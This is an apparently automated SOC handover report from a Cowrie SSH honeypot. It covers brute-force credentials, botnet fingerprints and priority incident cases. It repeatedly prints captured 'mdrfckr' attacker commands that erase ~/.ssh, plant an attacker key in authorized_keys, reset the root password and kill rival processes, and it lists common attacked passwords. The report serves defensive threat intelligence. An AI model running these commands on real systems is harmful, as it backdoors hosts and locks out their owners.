# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-08 |
| **Generated At** | 2026-06-08T11:03:43Z |
| **Shift Time** | 11:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **787** |
| Confirmed Threats | **750** |
| False Positives Filtered | **37** (4.7%) |
| Unique Attacker IPs | **52** |
| Countries of Origin | **19** |
| High Severity Cases | **108** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **679** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **292** |
| Unique Credential Pairs | **191** |
| Unique Usernames | **117** |
| Unique Passwords | **159** |
| Successful Auth Pairs | **71** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 108 |
| `345gs5662d34` | 51 |
| `user` | 3 |
| `frappe` | 3 |
| `ubuntu` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 51 |
| `3245gs5662d34` | 49 |
| `123456` | 17 |
| `123` | 7 |
| `12345` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 51 |
| `root` | `3245gs5662d34` | 49 |
| `root` | `@qwer2025` | 2 |
| `root` | `!QAZ4rfv` | 2 |
| `root` | `P@ssw0rd.2024` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `@qwer2025` | `103.163.117.84` | 2026-06-08T04:27:26 |
| `root` | `3245gs5662d34` | `103.163.117.84` | 2026-06-08T04:27:28 |
| `root` | `as123456` | `118.33.113.91` | 2026-06-08T04:27:40 |
| `root` | `3245gs5662d34` | `118.33.113.91` | 2026-06-08T04:27:44 |
| `root` | `Admin@666` | `103.163.117.84` | 2026-06-08T04:31:21 |
| `root` | `Test2025` | `103.163.117.84` | 2026-06-08T04:33:31 |
| `root` | `q1w2e3R4` | `118.33.113.91` | 2026-06-08T04:37:36 |
| `root` | `temp123!` | `118.33.113.91` | 2026-06-08T04:42:33 |
| `root` | `!@#$qwer1234` | `118.33.113.91` | 2026-06-08T04:57:32 |
| `root` | `Test123.` | `118.33.113.91` | 2026-06-08T05:02:32 |
| `root` | `abc@@123` | `118.33.113.91` | 2026-06-08T05:07:35 |
| `root` | `Ly123456` | `118.33.113.91` | 2026-06-08T05:12:35 |
| `root` | `ZAQ!xsw2` | `43.160.200.19` | 2026-06-08T06:00:02 |
| `root` | `3245gs5662d34` | `43.160.200.19` | 2026-06-08T06:00:04 |
| `root` | `1234567890qwe` | `67.241.132.98` | 2026-06-08T06:32:59 |
| `root` | `3245gs5662d34` | `67.241.132.98` | 2026-06-08T06:33:04 |
| `root` | `@qwer2025` | `14.103.112.14` | 2026-06-08T06:58:02 |
| `root` | `parola123` | `115.190.46.94` | 2026-06-08T07:08:20 |
| `root` | `123456@aa` | `154.81.14.172` | 2026-06-08T07:27:40 |
| `root` | `3245gs5662d34` | `154.81.14.172` | 2026-06-08T07:27:42 |
| `root` | `2233445566` | `14.103.112.14` | 2026-06-08T07:28:10 |
| `root` | `aaaa1111` | `118.145.230.7` | 2026-06-08T08:00:34 |
| `root` | `3245gs5662d34` | `118.145.230.7` | 2026-06-08T08:02:33 |
| `root` | `Wu123456` | `203.23.199.88` | 2026-06-08T08:10:57 |
| `root` | `3245gs5662d34` | `203.23.199.88` | 2026-06-08T08:11:01 |
| `root` | `1QAZ2WSX3EDC` | `95.71.127.158` | 2026-06-08T08:21:57 |
| `root` | `12341234` | `95.71.127.158` | 2026-06-08T08:26:14 |
| `root` | `!QAZ4rfv` | `58.6.206.239` | 2026-06-08T08:28:34 |
| `root` | `3245gs5662d34` | `58.6.206.239` | 2026-06-08T08:28:45 |
| `root` | `Qwe123` | `182.253.153.132` | 2026-06-08T08:29:01 |
| `root` | `3245gs5662d34` | `182.253.153.132` | 2026-06-08T08:29:06 |
| `root` | `Cloud@2024` | `34.71.30.159` | 2026-06-08T08:29:46 |
| `root` | `3245gs5662d34` | `34.71.30.159` | 2026-06-08T08:29:52 |
| `root` | `a@123456` | `95.71.127.158` | 2026-06-08T08:30:29 |
| `root` | `3245gs5662d34` | `95.71.127.158` | 2026-06-08T08:30:49 |
| `root` | `newpass` | `182.253.153.132` | 2026-06-08T08:31:06 |
| `root` | `Digital@2025` | `182.253.153.132` | 2026-06-08T08:39:06 |
| `root` | `A123456` | `34.71.30.159` | 2026-06-08T08:40:07 |
| `root` | `aaa` | `34.71.30.159` | 2026-06-08T08:46:30 |
| `root` | `Qwertyuiop123@` | `34.71.30.159` | 2026-06-08T08:48:35 |
| `root` | `Letmein!` | `34.71.30.159` | 2026-06-08T08:50:40 |
| `root` | `Huawei@5tgb` | `34.71.30.159` | 2026-06-08T08:59:08 |
| `root` | `whosyourdaddy` | `182.253.153.132` | 2026-06-08T09:01:53 |
| `root` | `123456789A` | `34.71.30.159` | 2026-06-08T09:03:21 |
| `root` | `ZAQ123wsx` | `34.71.30.159` | 2026-06-08T09:09:39 |
| `root` | `Qq123456!@#` | `182.253.153.132` | 2026-06-08T09:09:52 |
| `root` | `10041004` | `182.253.153.132` | 2026-06-08T09:11:55 |
| `root` | `Root123456789` | `95.71.127.158` | 2026-06-08T09:12:19 |
| `root` | `Yb123456` | `34.71.30.159` | 2026-06-08T09:16:03 |
| `root` | `P@55W0rd` | `182.253.153.132` | 2026-06-08T09:18:04 |
| `root` | `Qf123456` | `182.253.153.132` | 2026-06-08T09:20:06 |
| `root` | `1234QWERqwer` | `34.71.30.159` | 2026-06-08T09:24:26 |
| `root` | `qwe123!@` | `8.219.190.201` | 2026-06-08T09:38:08 |
| `root` | `abcd@1234` | `8.219.190.201` | 2026-06-08T09:38:33 |
| `root` | `test@123` | `8.219.190.201` | 2026-06-08T09:38:36 |
| `root` | `3141592653` | `95.71.127.158` | 2026-06-08T09:53:15 |
| `root` | `P@ssw0rd.2024` | `103.59.94.199` | 2026-06-08T10:17:39 |
| `root` | `3245gs5662d34` | `103.59.94.199` | 2026-06-08T10:17:44 |
| `root` | `Password@123321` | `106.51.92.114` | 2026-06-08T10:20:23 |
| `root` | `3245gs5662d34` | `106.51.92.114` | 2026-06-08T10:20:25 |
| `root` | `kucing123` | `106.51.92.114` | 2026-06-08T10:22:24 |
| `root` | `a5201314` | `106.51.92.114` | 2026-06-08T10:24:27 |
| `root` | `Root123...` | `106.51.92.114` | 2026-06-08T10:26:34 |
| `root` | `P@ssw0rd.2024` | `106.51.92.114` | 2026-06-08T10:30:29 |
| `root` | `lt123456` | `106.51.92.114` | 2026-06-08T10:34:20 |
| `root` | `qwepoi` | `106.51.92.114` | 2026-06-08T10:36:19 |
| `root` | `P@i#3.1415` | `106.51.92.114` | 2026-06-08T10:38:20 |
| `root` | `qwerty123456` | `106.51.92.114` | 2026-06-08T10:42:06 |
| `root` | `Wp123456` | `106.51.92.114` | 2026-06-08T10:49:45 |
| `root` | `wf123456` | `106.51.92.114` | 2026-06-08T10:53:40 |
| `root` | `555666` | `106.51.92.114` | 2026-06-08T10:57:37 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **787** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 301 |
| Go SSH scanner | 21 |
| OpenSSH | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 288 | 17 |
| `0a07365cc01f...` | Generic scanner | 18 | 1 |
| `03a80b21afa8...` | Modern SSH client | 7 | 2 |
| `873a5fb5fedc...` | Mirai/variant | 2 | 2 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 288 | 17 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 18 | 1 | Generic scanner |
| `03a80b21afa8...` | libssh | 7 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 3 | — |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `c118de82e19e...` | OpenSSH | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **6** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 49 | 13 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:x1cd6GRVapBD"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `115.190.46.94`, `14.103.112.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:NhHGBCohCLOR"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `95.71.127.158`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:T8qZCT6UVDUX"|chpasswd|bash
```
```
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
```
Source IPs: `95.71.127.158`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **52** |
| Unique ASNs | **41** |
| High-Risk ASNs | **34** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS398705` | Censys, Inc. | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (108)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3f2945fed2cc

| Field | Detail |
|---|---|
| **Source IP** | `103.163.117[.]84` |
| **First Seen** | 2026-06-08 04:27 |
| **Last Seen** | 2026-06-08 04:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:27:26` | `cowrie.session.connect` |
| `2026-06-08 04:27:26` | `cowrie.client.version` |
| `2026-06-08 04:27:26` | `cowrie.client.kex` |
| `2026-06-08 04:27:26` | `cowrie.login.success` |
| `2026-06-08 04:27:26` | `cowrie.session.params` |
| `2026-06-08 04:27:26` | `cowrie.command.input` |
| `2026-06-08 04:27:26` | `cowrie.command.failed` |
| `2026-06-08 04:27:27` | `cowrie.log.closed` |
| `2026-06-08 04:27:27` | `cowrie.session.params` |
| `2026-06-08 04:27:27` | `cowrie.command.input` |
| `2026-06-08 04:27:27` | `cowrie.session.file_download` |
| `2026-06-08 04:27:27` | `cowrie.log.closed` |
| `2026-06-08 04:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.117[.]84` to AbuseIPDB if not already reported
- [ ] Block `103.163.117[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c4cf7bc37f0

| Field | Detail |
|---|---|
| **Source IP** | `103.163.117[.]84` |
| **First Seen** | 2026-06-08 04:27 |
| **Last Seen** | 2026-06-08 04:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:27:28` | `cowrie.session.connect` |
| `2026-06-08 04:27:28` | `cowrie.client.version` |
| `2026-06-08 04:27:28` | `cowrie.client.kex` |
| `2026-06-08 04:27:28` | `cowrie.login.success` |
| `2026-06-08 04:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.117[.]84` to AbuseIPDB if not already reported
- [ ] Block `103.163.117[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fcf8361ab75

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 04:27 |
| **Last Seen** | 2026-06-08 04:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:27:40` | `cowrie.session.connect` |
| `2026-06-08 04:27:40` | `cowrie.client.version` |
| `2026-06-08 04:27:40` | `cowrie.client.kex` |
| `2026-06-08 04:27:40` | `cowrie.login.success` |
| `2026-06-08 04:27:40` | `cowrie.session.params` |
| `2026-06-08 04:27:40` | `cowrie.command.input` |
| `2026-06-08 04:27:40` | `cowrie.command.failed` |
| `2026-06-08 04:27:41` | `cowrie.log.closed` |
| `2026-06-08 04:27:41` | `cowrie.session.params` |
| `2026-06-08 04:27:41` | `cowrie.command.input` |
| `2026-06-08 04:27:41` | `cowrie.session.file_download` |
| `2026-06-08 04:27:41` | `cowrie.log.closed` |
| `2026-06-08 04:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e2e4d117f31

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 04:27 |
| **Last Seen** | 2026-06-08 04:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:27:43` | `cowrie.session.connect` |
| `2026-06-08 04:27:43` | `cowrie.client.version` |
| `2026-06-08 04:27:43` | `cowrie.client.kex` |
| `2026-06-08 04:27:44` | `cowrie.login.success` |
| `2026-06-08 04:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15761eac979d

| Field | Detail |
|---|---|
| **Source IP** | `103.163.117[.]84` |
| **First Seen** | 2026-06-08 04:31 |
| **Last Seen** | 2026-06-08 04:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:31:21` | `cowrie.session.connect` |
| `2026-06-08 04:31:21` | `cowrie.client.version` |
| `2026-06-08 04:31:21` | `cowrie.client.kex` |
| `2026-06-08 04:31:21` | `cowrie.login.success` |
| `2026-06-08 04:31:21` | `cowrie.session.params` |
| `2026-06-08 04:31:21` | `cowrie.command.input` |
| `2026-06-08 04:31:21` | `cowrie.command.failed` |
| `2026-06-08 04:31:22` | `cowrie.log.closed` |
| `2026-06-08 04:31:22` | `cowrie.session.params` |
| `2026-06-08 04:31:22` | `cowrie.command.input` |
| `2026-06-08 04:31:22` | `cowrie.session.file_download` |
| `2026-06-08 04:31:22` | `cowrie.log.closed` |
| `2026-06-08 04:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.117[.]84` to AbuseIPDB if not already reported
- [ ] Block `103.163.117[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-578e3b9e727d

| Field | Detail |
|---|---|
| **Source IP** | `103.163.117[.]84` |
| **First Seen** | 2026-06-08 04:31 |
| **Last Seen** | 2026-06-08 04:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:31:23` | `cowrie.session.connect` |
| `2026-06-08 04:31:23` | `cowrie.client.version` |
| `2026-06-08 04:31:23` | `cowrie.client.kex` |
| `2026-06-08 04:31:23` | `cowrie.login.success` |
| `2026-06-08 04:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.117[.]84` to AbuseIPDB if not already reported
- [ ] Block `103.163.117[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-579c53855926

| Field | Detail |
|---|---|
| **Source IP** | `103.163.117[.]84` |
| **First Seen** | 2026-06-08 04:33 |
| **Last Seen** | 2026-06-08 04:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:33:30` | `cowrie.session.connect` |
| `2026-06-08 04:33:30` | `cowrie.client.version` |
| `2026-06-08 04:33:30` | `cowrie.client.kex` |
| `2026-06-08 04:33:31` | `cowrie.login.success` |
| `2026-06-08 04:33:31` | `cowrie.session.params` |
| `2026-06-08 04:33:31` | `cowrie.command.input` |
| `2026-06-08 04:33:31` | `cowrie.command.failed` |
| `2026-06-08 04:33:31` | `cowrie.log.closed` |
| `2026-06-08 04:33:31` | `cowrie.session.params` |
| `2026-06-08 04:33:31` | `cowrie.command.input` |
| `2026-06-08 04:33:31` | `cowrie.session.file_download` |
| `2026-06-08 04:33:31` | `cowrie.log.closed` |
| `2026-06-08 04:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.117[.]84` to AbuseIPDB if not already reported
- [ ] Block `103.163.117[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d74254c078b

| Field | Detail |
|---|---|
| **Source IP** | `103.163.117[.]84` |
| **First Seen** | 2026-06-08 04:33 |
| **Last Seen** | 2026-06-08 04:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:33:32` | `cowrie.session.connect` |
| `2026-06-08 04:33:32` | `cowrie.client.version` |
| `2026-06-08 04:33:32` | `cowrie.client.kex` |
| `2026-06-08 04:33:33` | `cowrie.login.success` |
| `2026-06-08 04:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.117[.]84` to AbuseIPDB if not already reported
- [ ] Block `103.163.117[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc4c6119d1e7

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 04:37 |
| **Last Seen** | 2026-06-08 04:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
